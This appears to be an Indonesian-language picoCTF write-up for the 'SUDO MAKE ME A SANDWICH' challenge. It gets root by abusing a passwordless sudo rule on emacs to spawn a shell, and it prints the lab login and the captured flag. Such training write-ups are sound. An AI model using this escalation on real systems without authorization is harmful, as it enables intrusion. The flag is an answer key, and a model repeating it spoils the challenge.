## SUDO MAKE ME A SANDWICH

## Description
> Can you read the flag? I think you can!
> Additional details will be available after launching your challenge instance.

## Penyelesaian
Disini jika kita launch Challangenya, maka akan diberikan : 
> ssh -p 55743 ctf-player@green-hill.picoctf.net using password 430838f7

okey, kita akan langsung saja masuk ke terminal dan melakukan ssh sesuai dengan yang diminta di soal 

```
ctf-player@challenge:~$ ls -la
total 16
drwxr-xr-x 1 ctf-player ctf-player   20 May  1 07:02 .
drwxr-xr-x 1 root       root         24 Mar  9 21:32 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Feb 25  2020 .bashrc
drwx------ 2 ctf-player ctf-player   34 May  1 07:02 .cache
-rw-r--r-- 1 ctf-player ctf-player  807 Feb 25  2020 .profile
-r--r----- 1 root       root         31 Mar  9 21:32 flag.txt
ctf-player@challenge:~$ cat flag.txt 
cat: flag.txt: Permission denied
```
Ternyata langsung ada file flag.txt namun saat kita coba cat tidak bisa karena memang tidak diizinkan aksesnya untuk kita, jadi kita bisa menggunakan cara berikut :
```
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```
dapat dilihat bahwa ada tulisan `(ALL) NOPASSWD: /bin/emacs`

Artinya kita bisa punya akses ke semua itu dengan cara melakukan sudo seperti berikut 
```
ctf-player@challenge:~$ sudo /bin/emacs
```
Kemudian kita akan masuk ke satu halaman, langsung tekan ALT + X saja, kemudian ketik "shell" dan enter. Kita akan langsung masuk ke bagian root dari koneksi ini sehingga kita bisa langsung bisa membaca dan mengakses file flag.txt
```
root@challenge:/home/ctf-player# ls
flag.txt
root@challenge:/home/ctf-player# cat flag.txt 
picoCTF{ju57_5ud0_17_c2c0d2e2}
```
## Flag
`picoCTF{ju57_5ud0_17_c2c0d2e2}`


